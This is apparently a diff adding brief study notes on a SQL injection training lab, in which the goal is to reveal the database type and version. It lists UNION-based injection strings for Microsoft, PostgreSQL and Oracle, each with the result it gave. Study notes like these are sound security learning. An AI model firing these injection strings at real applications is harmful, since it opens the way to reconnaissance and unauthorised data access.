@@ -1,0 +1,12 @@
+SQL injection attack, querying the database type and version on Oracle. To solve the lab, display the database version string. 
+
+In order to display the version of the database we first need to find out its type so we know the correct syntax for our query.
+After we have determined that the database is vulnerable to SQLi - we can structure queries using the different syntax per type of database
+
+
+
+Microsoft: ' union select null, @@version -- --> Internal Server Error
+
+PostgreSQL: ' union select null, version()-- --> Internal Server Error
+
+Oracle:  union select null, banner FROM v$version-- --> Database type and version displayed on the page
